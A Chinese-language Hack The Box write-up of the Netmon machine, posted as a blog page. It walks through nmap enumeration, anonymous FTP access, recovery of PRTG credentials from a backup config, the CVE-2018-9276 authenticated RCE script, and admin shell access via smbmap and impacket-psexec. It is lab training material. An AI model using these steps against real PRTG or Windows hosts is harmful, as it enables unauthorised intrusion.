@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Preface 这是Hackthebox里面一个简单的机器，因为刚好用到这个机器并且决定写一个记录平时CTF的Writeup，故写下这篇文章。CyberSecure这些东西很多都很繁杂，光是靠脑袋是记不住的，有些东西得自己亲自写一遍或者手记一下过程，特别是能够自己独立分析漏洞，写下分析过程更有利于自己整理出思绪，博客更多也是给自己看的，所以就不弄图床来放图片演示了。  Enumeration 首">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Netmon Machine Challenge">
+<meta property="og:url" content="http://example.com/2022/08/04/htb-netmon/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="Preface 这是Hackthebox里面一个简单的机器，因为刚好用到这个机器并且决定写一个记录平时CTF的Writeup，故写下这篇文章。CyberSecure这些东西很多都很繁杂，光是靠脑袋是记不住的，有些东西得自己亲自写一遍或者手记一下过程，特别是能够自己独立分析漏洞，写下分析过程更有利于自己整理出思绪，博客更多也是给自己看的，所以就不弄图床来放图片演示了。  Enumeration 首">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-04T08:05:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="CVE-2018-9276">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Weak Authentication">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Netmon Machine Challenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/08/04/htb-under-constraction/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/04/htb-netmon/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/04/htb-netmon/&text=HTB Netmon Machine Challenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/04/htb-netmon/&is_video=false&description=HTB Netmon Machine Challenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Netmon Machine Challenge&body=Check out this article: http://example.com/2022/08/04/htb-netmon/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/04/htb-netmon/&name=HTB Netmon Machine Challenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/04/htb-netmon/&t=HTB Netmon Machine Challenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#preface"><span class="toc-number">1.</span> <span class="toc-text"> Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#enumeration"><span class="toc-number">2.</span> <span class="toc-text"> Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E7%94%A8%E6%88%B7%E7%BB%84flag"><span class="toc-number">2.1.</span> <span class="toc-text"> 拿到用户组flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#foothold"><span class="toc-number">3.</span> <span class="toc-text"> Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%9580%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.1.</span> <span class="toc-text"> 尝试80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E7%A8%8B%E5%BA%8F%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95"><span class="toc-number">3.2.</span> <span class="toc-text"> 寻找程序数据目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E7%A8%8B%E5%BA%8F%E5%90%8E%E5%8F%B0"><span class="toc-number">3.3.</span> <span class="toc-text"> 进入程序后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">3.4.</span> <span class="toc-text"> 引用脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0root%E6%9D%83%E9%99%90"><span class="toc-number">3.5.</span> <span class="toc-text"> 拿到root权限</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB Netmon Machine Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-04T08:05:00.000Z" itemprop="datePublished">2022-08-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Machine/">Machine</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CVE-2018-9276/" rel="tag">CVE-2018-9276</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/Weak-Authentication/" rel="tag">Weak Authentication</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="preface"><a class="markdownIt-Anchor" href="#preface"></a> Preface</h2>
+<p>这是Hackthebox里面一个简单的机器，因为刚好用到这个机器并且决定写一个记录平时CTF的Writeup，故写下这篇文章。CyberSecure这些东西很多都很繁杂，光是靠脑袋是记不住的，有些东西得自己亲自写一遍或者手记一下过程，特别是能够自己独立分析漏洞，写下分析过程更有利于自己整理出思绪，博客更多也是给自己看的，所以就不弄图床来放图片演示了。</p>
+<h2 id="enumeration"><a class="markdownIt-Anchor" href="#enumeration"></a> Enumeration</h2>
+<p>首先进行对主机端口开放的情况进行探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sC -sV Netmon.htb</span><br></pre></td></tr></table></figure>
+<p>发现端口开放情况及其版本信息如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">21/tcp  open  ftp          Microsoft ftpd</span><br><span class="line">80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<p>nmap启动的脚本检测检测到FTP允许Anonymous匿名登录，尝试登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ ftp Anonymous@10.10.10.152</span><br><span class="line">Connected to 10.10.10.152.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line">ftp&gt; dir</span><br><span class="line">229 Entering Extended Passive Mode (|||50149|)</span><br><span class="line">150 Opening ASCII mode data connection.</span><br><span class="line">02-03-19  12:18AM                 1024 .rnd</span><br><span class="line">02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span><br><span class="line">02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">02-03-19  08:08AM       &lt;DIR&gt;          Users</span><br><span class="line">02-25-19  11:49PM       &lt;DIR&gt;          Windows</span><br></pre></td></tr></table></figure>
+<h3 id="拿到用户组flag"><a class="markdownIt-Anchor" href="#拿到用户组flag"></a> 拿到用户组flag</h3>
+<p>公开自己的C盘目录一个巨大的错误，尝试访问<code>Users\Administrator</code>无权限后，我们访问<code>Users\Public</code>文件夹，在里面可以拿到user.txt</p>
+<h2 id="foothold"><a class="markdownIt-Anchor" href="#foothold"></a> Foothold</h2>
+<h3 id="尝试80端口"><a class="markdownIt-Anchor" href="#尝试80端口"></a> 尝试80端口</h3>
+<p>可以从nmap的版本嗅探中获取到80端口上运行的web服务是Paessler PRTG bandwidth monitor <code>18.1.37.13946</code>，登录到服务业，网页需要我们输入凭证进行身份验证，很明显我们并没有合法的凭据验证，所以我们尝试Google获取该服务默认安装凭证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User: prtgadmin</span><br><span class="line">Pass: prtgadmin</span><br></pre></td></tr></table></figure>
+<p>不出意料的没有成功进入后台，目光回到含有大量可用信息的FTP服务，由于部分原因我决定将Linux上的80服务ssh反代理到本地Windows，仅用本地浏览器就可以进行访问被测主机内网80端口，需要用PowerShell运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh kali@&#123;LAN_ip&#125; -L 8081:10.10.10.152:80</span><br><span class="line"></span><br><span class="line">available format:</span><br><span class="line">-L [bind_address:]port:host:hostport</span><br><span class="line">-L [bind_address:]port:remote_socket</span><br><span class="line">-L local_socket:host:hostport</span><br><span class="line">-L local_socket:remote_socket</span><br></pre></td></tr></table></figure>
+<h3 id="寻找程序数据目录"><a class="markdownIt-Anchor" href="#寻找程序数据目录"></a> 寻找程序数据目录</h3>
+<p>在之前我们已经发现主机是Windows Server 2008的系统，通过Google我发现了一下可用数据:<br />
+<strong>Windows Server 2012 (R2), Windows Server 2016, Windows 10, Windows 8.1, Windows 8, Windows 7, Windows Server 2008 R2:</strong></p>
+<p><code>%programdata%\Paessler\PRTG Network Monitor</code></p>
+<p><strong>Windows XP, Windows 2003:</strong></p>
+<p><code>%ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor</code><br />
+通过配置文件用途介绍，我找到了最价值的内容：</p>
+<blockquote>
+<p>File Name:PRTG Configuration.dat<br />
+Format:XML<br />
+monitoring configuration (i.e. probes, groups, devices, sensors, users, maps, reports, etc.)</p>
+</blockquote>
+<p>描述中提到了 user,我们可能能够在其中找到进入PRTG的凭据，进入相关文件夹，目录显示如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">12-15-21  08:23AM       &lt;DIR&gt;          Configuration Auto-Backups</span><br><span class="line">08-04-22  04:02AM       &lt;DIR&gt;          Log Database</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (Debug)</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (Sensors)</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (System)</span><br><span class="line">08-04-22  04:02AM       &lt;DIR&gt;          Logs (Web Server)</span><br><span class="line">08-04-22  04:07AM       &lt;DIR&gt;          Monitoring Database</span><br><span class="line">02-25-19  10:54PM              1189697 PRTG Configuration.dat</span><br><span class="line">02-25-19  10:54PM              1189697 PRTG Configuration.old</span><br><span class="line">07-14-18  03:13AM              1153755 PRTG Configuration.old.bak</span><br><span class="line">08-04-22  06:08AM              1722137 PRTG Graph Data Cache.dat</span><br><span class="line">02-25-19  11:00PM       &lt;DIR&gt;          Report PDFs</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          System Information Database</span><br><span class="line">02-03-19  12:40AM       &lt;DIR&gt;          Ticket Database</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          ToDo Database</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>
+<p>最终在<code>PRTG Configuration.old.bak</code>找到了账户prtgadmin密码PrTg@dmin2018</p>
+<h3 id="进入程序后台"><a class="markdownIt-Anchor" href="#进入程序后台"></a> 进入程序后台</h3>
+<p>我们通过得到的凭据我们尝试进入后台，发现密码还是不对，可能是密码是从备份文件中找出的？管理员已经修改了他的密码，密码的2018与备份时间18年一致，而正在被使用的.dat文件时间显示是19年，我尝试了新密码PrTg@dmin2019，最终成功进入了后台。</p>
+<p>先在终端运行<code>searchsploit &quot;prtg&quot;</code>看看是否有当前版本已经存在的漏洞得到了反馈结果<br />
+<code>PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</code></p>
+<h3 id="引用脚本"><a class="markdownIt-Anchor" href="#引用脚本"></a> 引用脚本</h3>
+<p>我们在这里发现了已经有相关脚本可以对目标进行爆破，运行脚本，根据脚本的帮助信息我获取到了我登陆PRTG后的cookie，终端给脚本参数：</p>
+<p><code>./&#123;script_name&#125;.sh -u http://netmon.htb/ -c &quot;&#123;your_auhthentic_cookie&#125;&quot;</code></p>
+<p>运行后，脚本成功利用漏洞在系统创建了一个在Administrators组的账户，默认账户和密码分别是<code>pentest</code>和<code>P3nT3st!</code>,</p>
+<h3 id="拿到root权限"><a class="markdownIt-Anchor" href="#拿到root权限"></a> 拿到root权限</h3>
+<p>终端运行<code>smbmap -H netmon.htb -u pentest -p P3nT3st!</code>我们已经有了ADMIN$ 和 C$的RW权限</p>
+<p>接下来用impacket-psexec以管理员身份进入目标主机的终端管理<br />
+<code>impacket-psexec &quot;pentest@netmon.htb&quot;</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#preface"><span class="toc-number">1.</span> <span class="toc-text"> Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#enumeration"><span class="toc-number">2.</span> <span class="toc-text"> Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E7%94%A8%E6%88%B7%E7%BB%84flag"><span class="toc-number">2.1.</span> <span class="toc-text"> 拿到用户组flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#foothold"><span class="toc-number">3.</span> <span class="toc-text"> Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%9580%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.1.</span> <span class="toc-text"> 尝试80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E7%A8%8B%E5%BA%8F%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95"><span class="toc-number">3.2.</span> <span class="toc-text"> 寻找程序数据目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E7%A8%8B%E5%BA%8F%E5%90%8E%E5%8F%B0"><span class="toc-number">3.3.</span> <span class="toc-text"> 进入程序后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">3.4.</span> <span class="toc-text"> 引用脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0root%E6%9D%83%E9%99%90"><span class="toc-number">3.5.</span> <span class="toc-text"> 拿到root权限</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/04/htb-netmon/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/04/htb-netmon/&text=HTB Netmon Machine Challenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/04/htb-netmon/&is_video=false&description=HTB Netmon Machine Challenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Netmon Machine Challenge&body=Check out this article: http://example.com/2022/08/04/htb-netmon/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/04/htb-netmon/&title=HTB Netmon Machine Challenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/04/htb-netmon/&name=HTB Netmon Machine Challenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/04/htb-netmon/&t=HTB Netmon Machine Challenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
